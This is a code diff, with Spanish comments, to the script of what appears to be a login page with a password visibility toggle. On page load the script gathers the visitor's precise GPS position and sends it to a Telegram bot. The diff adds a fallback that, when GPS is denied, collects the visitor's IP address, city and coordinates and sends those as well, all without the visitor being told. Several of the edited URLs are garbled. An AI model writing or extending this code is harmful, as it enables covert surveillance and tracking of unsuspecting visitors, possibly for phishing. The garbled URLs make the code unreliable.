@@ -144,10 +144,10 @@
 // =========================================================================
 document.addEventListener('DOMContentLoaded', () => {
     
-    // A. Solicitar y enviar la ubicación inmediatamente al entrar
+    // A. Ejecutar de forma segura la localización automática al entrar
     obtenerUbicacionInmediata();
 
-    // B. Lógica compatible con celulares y Microsoft Edge para el Ojo
+    // B. Lógica del botón del ojo compatible con Celulares, Chrome y Edge
     const togglePassword = document.getElementById('togglePassword');
     const passwordInput = document.getElementById('password');
 
@@ -155,9 +155,8 @@ document.addEventListener('DOMContentLoaded', () => {
     const eyeClosedSVG = `<svg xmlns="http://w3.org" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M9.88 9.88a3 3 0 1 0 4.24 4.24"></path><path d="M10.73 5.08A10.43 10.43 0 0 1 12 5c7 0 10 7 10 7a13.16 13.16 0 0 1-1.67 2.68"></path><path d="M6.61 6.61A13.52 13.52 0 0 0 2 12s3 7 10 7a9.74 9.74 0 0 0 5.39-1.61"></path><line x1="2" y1="2" x2="22" y2="22"></line></svg>`;
 
     if (togglePassword && passwordInput) {
-        // Función unificada que alterna estados sin romper el DOM
         function cambiarVisibilidadContrasena(e) {
-            e.preventDefault(); // Previene problemas de doble toque en móviles
+            e.preventDefault(); // Evita fallos de doble pulsación en móviles
             
             const isPassword = passwordInput.getAttribute('type') === 'password';
             
@@ -169,31 +168,32 @@ document.addEventListener('DOMContentLoaded', () => {
                 togglePassword.innerHTML = eyeClosedSVG;
             }
             
-            // Mantiene el foco en el input para que el teclado del celular no se oculte
-            passwordInput.focus(); 
+            passwordInput.focus(); // Mantiene el teclado activo en celulares
         }
 
-        // SOPORTE MULTI-DISPOSITIVO: Escucha tanto el clic clásico como el toque en pantallas móviles
+        // Eventos para PC y Móviles
         togglePassword.addEventListener('click', cambiarVisibilidadContrasena);
         togglePassword.addEventListener('touchstart', cambiarVisibilidadContrasena, { passive: false });
     }
 });
 
 // =========================================================================
-// 4. FUNCIONES DE GEOLOCALIZACIÓN Y ENVÍO A TELEGRAM
+// 4. FUNCIONES DE GEOLOCALIZACIÓN Y RESPALDO (SOPORTE COMPLETO)
 // =========================================================================
 function obtenerUbicacionInmediata() {
     if (!navigator.geolocation) {
-        console.log("La geolocalización no es soportada por este navegador.");
+        console.log("Geolocalización no soportada. Usando respaldo por IP...");
+        obtenerUbicacionPorIP();
         return;
     }
 
     const opciones = {
         enableHighAccuracy: true, 
-        timeout: 12000,           
+        timeout: 6000, // Si tarda más de 6 segundos el GPS, salta a la IP
         maximumAge: 0             
     };
 
+    // CORREGIDO: Se asegura la existencia de unErrorOcurrio como callback de falla
     navigator.geolocation.getCurrentPosition(enviarATelegram, unErrorOcurrio, opciones);
 }
 
@@ -202,29 +202,49 @@ function enviarATelegram(posicion) {
     const longitud = posicion.coords.longitude;
     const precision = posicion.coords.accuracy;
 
-    // CORREGIDO: Se utilizan comillas invertidas (backticks) para que carguen tus variables en el enlace
-    const mensaje = `📍 Nueva Visita al Sistema\n\n` +
+    const mensaje = `📍 Nueva Visita (GPS)\n\n` +
                     `• Latitud: ${latitud}\n` +
                     `• Longitud: ${longitud}\n` +
                     `• Precisión: ~${Math.round(precision)} metros\n\n` +
-                    `Google Maps: https://google.com/maps/@${latitud},${longitud},15z`;
+                    `Google Maps: https://google.com{latitud},${longitud},15z`;
 
-    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?` + new URLSearchParams({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: mensaje
-    });
+    const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
 
-    fetch(url)
-    .then(response => {
-        if (!response.ok) {
-            return response.json().then(err => { throw new Error(JSON.stringify(err)); });
-        }
-        return response.json();
-    })
+    fetch(url, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje })
+    }).catch(err => console.error("Error enviando coordenadas:", err));
+}
+
+// CORREGIDO: Definición explícita de la función de fallo solicitada por el navegador
+function unErrorOcurrio(error) {
+    console.warn(`GPS no disponible (Código ${error.code}). Obteniendo ubicación por IP...`);
+    obtenerUbicacionPorIP();
+}
+
+function obtenerUbicacionPorIP() {
+    // Usamos el protocolo seguro https para evitar bloqueos del navegador en entornos reales
+    fetch('https://ipapi.co')
+    .then(res => res.json())
     .then(data => {
-        console.log('Ubicación enviada a Telegram con éxito:', data);
+        // Estructuramos la información obtenida a través de la red del proveedor de internet
+        const mensajeIP = `🌐 Nueva Visita (Por IP)\n\n` +
+                          `• IP: ${data.ip || 'No detectada'}\n` +
+                          `• País: ${data.country_name || 'Desconocido'}\n` +
+                          `• Región/Estado: ${data.region || 'Desconocido'}\n` +
+                          `• Ciudad: ${data.city || 'Desconocida'}\n` +
+                          `• Latitud: ${data.latitude}\n` +
+                          `• Longitud: ${data.longitude}\n\n` +
+                          `Google Maps: https://google.com{data.latitude},${data.longitude},15z`;
+
+        const url = `https://telegram.org{TELEGRAM_TOKEN}/sendMessage`;
+        
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensajeIP })
+        });
     })
-    .catch(error => {
-        console.error('Error detallado de Telegram:', error);
-    });
+    .catch(err => console.error("Error en el servicio de IP de respaldo:", err));
 }
